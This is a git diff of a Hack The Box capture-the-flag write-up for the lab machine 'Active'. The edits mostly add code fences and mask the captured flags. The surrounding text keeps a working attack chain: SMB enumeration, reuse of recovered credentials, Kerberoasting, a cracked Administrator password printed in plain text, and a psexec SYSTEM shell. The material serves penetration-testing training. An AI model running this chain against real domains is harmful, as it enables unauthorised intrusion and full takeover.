@@ -21,7 +21,7 @@ Active is an Easy-rated Windows machine on Hack The Box featuring a Windows Serv
 ```bash
 nmap -sC -sV 10.129.108.70
 ```
-
+```bash
 PORT STATE SERVICE VERSION
 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-15 09:33:28Z)
@@ -35,7 +35,7 @@ PORT STATE SERVICE VERSION
 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
 3269/tcp open tcpwrapped
 49152-49158/tcp open msrpc Microsoft Windows RPC
-
+```
 
 The port spread (53, 88, 135, 139, 389, 445, 464, 3268) is the signature fingerprint of a Windows domain controller, confirming the `active.htb` domain and `DC` hostname.
 
@@ -48,7 +48,7 @@ smbclient -L //10.129.108.70 -N
 ```
 
 Sharename Type Comment
-
+```bash
 ADMIN$ Disk Remote Admin
 C$ Disk Default share
 IPC$ IPC Remote IPC
@@ -56,7 +56,7 @@ NETLOGON Disk Logon server share
 Replication Disk
 SYSVOL Disk Logon server share
 Users Disk
-
+```
 
 Checking permissions with smbmap showed the **Replication** share was readable anonymously while everything else required auth:
 
@@ -65,7 +65,7 @@ smbmap -H 10.129.108.70
 ```
 
 Disk Permissions Comment
-
+```bash
 ADMIN$ NO ACCESS Remote Admin
 C$ NO ACCESS Default share
 IPC$ NO ACCESS Remote IPC
@@ -73,7 +73,7 @@ NETLOGON NO ACCESS Logon server share
 Replication READ ONLY
 SYSVOL NO ACCESS Logon server share
 Users NO ACCESS
-
+```
 
 ## Foothold
 
@@ -122,26 +122,26 @@ netexec smb 10.129.108.70 -u svc_tgs -p 'GPPstillStandingStrong2k18' --shares
 
 [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
 Share Permissions Remark
-
+``bash
 NETLOGON READ Logon server share
 Replication READ
 SYSVOL READ Logon server share
 Users READ
-
+```
 
 With valid creds, the `Users` share is now readable:
 
 ```bash
 smbclient //10.129.108.70/Users -U svc_tgs GPPstillStandingStrong2k18
 ```
-
+```bash
 Administrator D 0 Mon Jul 16 06:14:21 2018
 SVC_TGS D 0 Sat Jul 21 11:16:32 2018
-
+```
 
 Grabbed the user flag from `SVC_TGS\Desktop\user.txt`:
 
-b20797df005f403fb19bfd9aa3d2b278
+b20797df005f403f****************
 
 
 ## Privilege Escalation
@@ -151,7 +151,9 @@ b20797df005f403fb19bfd9aa3d2b278
 With a valid domain account in hand, the next step is to check for kerberoastable service accounts:
 
 ```bash
-impacket-GetUserSPNs -dc-ip 10.129.108.70 active.htb/svc_tgs:'GPPstillStandingStrong2k18' -request
+impacket-GetUserSPNs -dc-ip 10.129.108.70 \
+  active.htb/svc_tgs:'GPPstillStandingStrong2k18' \
+  -request
 ```
 
 ServicePrincipalName Name MemberOf PasswordLastSet LastLogon
@@ -169,10 +171,10 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c0d750cf5029cd13
 ```bash
 hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
 ```
-
+```bash
 Status...........: Cracked
 Password: Ticketmaster1968
-
+```
 
 ### Administrator Access
 
@@ -181,13 +183,13 @@ With cracked Administrator credentials, dropped straight into a SYSTEM shell via
 ```bash
 impacket-psexec active.htb/Administrator@10.129.108.70
 ```
-
+```bash
 [] Found writable share ADMIN$
 [] Uploading file PgkCLHjX.exe
 [] Opening SVCManager on 10.129.108.70.....
 [] Creating service YpKO on 10.129.108.70.....
 [*] Starting service YpKO.....
-
+```
 C:\Windows\system32> whoami
 nt authority\system
 
@@ -198,7 +200,7 @@ Grabbed the root flag:
 C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
-e1f594529cf4a4800856139065baf5d0
+e1f594529cf4a480****************
 
 
 ## Summary
